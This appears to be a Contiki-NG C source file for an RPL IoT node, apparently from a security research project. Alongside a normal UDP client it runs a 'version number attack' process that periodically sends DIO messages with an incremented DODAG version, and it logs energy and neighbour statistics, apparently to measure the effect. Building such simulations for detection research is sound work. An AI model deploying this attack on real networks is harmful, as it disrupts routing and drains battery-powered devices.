#include "project-conf.h"
#include "contiki.h"
#include "net/routing/rpl-classic/rpl-private.h"
#include "net/routing/rpl-classic/rpl-dag-root.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include "net/ipv6/uip-ds6-nbr.h"
#include "net/ipv6/uip-icmp6.h"
#include "net/ipv6/uiplib.h"
#include "hack.h"

#include "sys/energest.h"
#include "services/simple-energest/simple-energest.h"
#include <stdlib.h>
#include <stdio.h>

#include "sys/log.h"
#include "attributes.h"

#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1
#define UDP_CLIENT_PORT	8765
#define UDP_SERVER_PORT	5678
#define SEND_INTERVAL		  (60 * CLOCK_SECOND)
#define INIT_ATTACK     (120 * CLOCK_SECOND)
/*#define RX_CURRENT 18800ul
#define TX_CURRENT 17400ul
#define CPU_CURRENT 426ul
#define LPM_CURRENT 20ul*/
/*-----------------------------------prototypes-----------------------------------*/
uip_ds6_nbr_t *uip_ds6_nbr_head(void);
uip_ds6_nbr_t *uip_ds6_nbr_next(uip_ds6_nbr_t *nbr);
 void free_neighbor_list(void);
 rpl_rank_t increase_rank(rpl_rank_t base_rank);
 rpl_rank_t my_rank(void);
 uip_ipaddr_t *rpl_parent_get_ipaddr(rpl_parent_t *nbr);
/*  static void simple_energest_step(void);
*/ static const char *rpl_ocp_to_str(int ocp);
/*-----------------------------------variables-----------------------------------*/
 static int ptosend = 0;
  static int ptorecev = 0;
/*static unsigned long last_tx, last_rx, last_time, last_cpu, last_lpm, last_deep_lpm;
static unsigned long delta_tx, delta_rx, delta_time, delta_cpu, delta_lpm, delta_deep_lpm;
static unsigned long curr_tx, curr_rx, curr_time, curr_cpu, curr_lpm, curr_deep_lpm;
static unsigned long E, P;*/

static struct simple_udp_connection udp_conn;
 rpl_instance_t *current_instance ;
 rpl_rank_t legitimate_rank;
 rpl_rank_t illegitimate_rank;
/*---------------------------------------------------------------------------*/
PROCESS(udp_client_process, "UDP client");
PROCESS(version_number_attack, "version number attack");
AUTOSTART_PROCESSES(&udp_client_process,&version_number_attack);
/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
         const uip_ipaddr_t *sender_addr,
         uint16_t sender_port,
         const uip_ipaddr_t *receiver_addr,
         uint16_t receiver_port,
         const uint8_t *data,
         uint16_t datalen)
{
  ptorecev++;
  LOG_INFO("Received response '%.*s' from ", datalen, (char *) data);
  LOG_INFO_6ADDR(sender_addr);
#if LLSEC802154_CONF_ENABLED
  LOG_INFO_(" LLSEC LV:%d", uipbuf_get_attr(UIPBUF_ATTR_LLSEC_LEVEL));
#endif
  LOG_INFO_("\n");

}

/*list of neighbord*/
 void display()
{
  if(!current_instance->used) {
    LOG_INFO("-- Instance: None\n");
  }else{
    LOG_INFO(" -- version: %u -- OF: %s -- Rank: %u -- illegitiate_Rank: %u -- pref_parent: "
    ,current_instance->current_dag->version,rpl_ocp_to_str(current_instance->of->ocp),legitimate_rank, illegitimate_rank);
    LOG_INFO_6ADDR(rpl_parent_get_ipaddr(current_instance->current_dag->preferred_parent));
    printf(" -- Trickle_timer: current %u min %u max %u DIO_INIT %u DIO_OUT %u DIO_IN %u",
      current_instance->dio_intcurrent, current_instance->dio_intmin,
      (current_instance->dio_intmin + current_instance->dio_intdoubl), current_instance->dio_totint, current_instance->dio_totsend, current_instance->dio_totrecv);
   printf(" DIS_OUT: %u DIS_IN: %u DAO_OUT: %u DAO_IN: %u",dis_send, dis_recv, dao_send, dao_recv);
    
/*    simple_energest_step();
*/ printf(" -- Period_summary 0 ( 60 seconds) -- Energie: %10lu -- Puissance %10lu",e, p);
   printf(" -- DTSN_out: %u -- data_sent: %d -- data_receved: %d", current_instance->dtsn_out, ptosend, ptorecev);
     printf(" Liste_des_voisins: ");
    uip_ds6_nbr_t *nbr_l;
    for(nbr_l = uip_ds6_nbr_head(); nbr_l != NULL; nbr_l = uip_ds6_nbr_next(nbr_l)) {
      LOG_INFO_6ADDR(&nbr_l->ipaddr);
      if(uip_ds6_nbr_next(nbr_l) != NULL){printf("|");}
      
    }
    
    printf("\n");
    free_neighbor_list();
  }
  
}

// calcul de l'energie

/*static void
simple_energest_step(void)
{
  static unsigned count = 0;

  energest_flush();

  curr_time = ENERGEST_GET_TOTAL_TIME();
  curr_cpu = energest_type_time(ENERGEST_TYPE_CPU);
  curr_lpm = energest_type_time(ENERGEST_TYPE_LPM);
  curr_deep_lpm = energest_type_time(ENERGEST_TYPE_DEEP_LPM);
  curr_tx = energest_type_time(ENERGEST_TYPE_TRANSMIT);
  curr_rx = energest_type_time(ENERGEST_TYPE_LISTEN);

  delta_time = curr_time - last_time;
  delta_cpu = curr_cpu - last_cpu;
  delta_lpm = curr_lpm - last_lpm;
  delta_deep_lpm = curr_deep_lpm - last_deep_lpm;
  delta_tx = curr_tx - last_tx;
  delta_rx = curr_rx - last_rx;

  last_time = curr_time;
  last_cpu = curr_cpu;
  last_lpm = curr_lpm;
  last_deep_lpm = curr_deep_lpm;
  last_tx = curr_tx;
  last_rx = curr_rx;
  E = ( ((delta_cpu/ENERGEST_SECOND) * CPU_CURRENT* 3) + ((delta_lpm/ENERGEST_SECOND) * LPM_CURRENT * 3) + ((delta_tx/ENERGEST_SECOND) * TX_CURRENT * 3) + 
    ((delta_rx/ENERGEST_SECOND) * RX_CURRENT * 3));
  P = (E/(delta_time/ENERGEST_SECOND));
   printf(" -- Period_summary %u ( %lu seconds) -- Energie: %10lu -- Puissance %10lu",count++, (delta_time/ENERGEST_SECOND), E, P);
}*/

/*free neighbord list */

  void free_neighbor_list()
{
  LOG_INFO("Liste des voisins:\n");
  uip_ds6_nbr_t *nbr_l;
  for(nbr_l = uip_ds6_nbr_head(); nbr_l != NULL; nbr_l = uip_ds6_nbr_next(nbr_l)) {
     uip_ds6_nbr_rm(nbr_l);
   
  }
}

/*increase rank */
  rpl_rank_t increase_rank(rpl_rank_t base_rank)
 {

 rpl_rank_t increment = current_instance->current_dag->instance->min_hoprankinc; 

  return base_rank + increment;
 }

 /*get rank */
  rpl_rank_t my_rank()
 {
  return current_instance->current_dag->rank;
 }
 
/*objectif function */
static const char *rpl_ocp_to_str(int ocp)
{
  switch(ocp) {
    case RPL_OCP_OF0:
      return "OF0";
    case RPL_OCP_MRHOF:
      return "MRHOF";
    default:
      return "Unknown";
  }
}

void sent_dio_to_nbr(){
  
            dio_output(current_instance,NULL);

}

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(udp_client_process, ev, data)
{
  static struct etimer periodic_timer;
  static unsigned count;
  static char str[32];
  uip_ipaddr_t dest_ipaddr;
  current_instance = rpl_get_default_instance();
  legitimate_rank = my_rank();
  illegitimate_rank = increase_rank(legitimate_rank);
  //static int attack = 0;
  set_hack(4);
  set_version(4);
  PROCESS_BEGIN();
  /* Initialize UDP connection */
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                      UDP_SERVER_PORT, udp_rx_callback);

  etimer_set(&periodic_timer, random_rand() % SEND_INTERVAL);
  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));      
    if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
      /* Send to DAG root */
      //status();
      LOG_INFO("Sending request %u to ", count);
      LOG_INFO_6ADDR(&dest_ipaddr);
      LOG_INFO_("\n");
      snprintf(str, sizeof(str), "hello %d", count);
      simple_udp_sendto(&udp_conn, str, strlen(str), &dest_ipaddr);
      count++;
       ptosend = (int)count;
      display();
    } else {
      LOG_INFO("Not reachable yet\n");
      display();
    }

    /* Add some jitter */
    etimer_set(&periodic_timer, SEND_INTERVAL
      - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));

  }


  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(version_number_attack, ev, data){

static struct etimer timer;
static int compter ;
  PROCESS_BEGIN();
  compter = current_instance->current_dag->version +1;
  etimer_set(&timer, INIT_ATTACK);
  while(1) {
        
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));      
         /*current_instance->current_dag->version = v;*/
        //sent dio with  number version modified
        sent_dio_to_nbr();
        set_version(compter); 
        compter = compter +1;
        etimer_set(&timer, INIT_ATTACK);

  }
  PROCESS_END();
}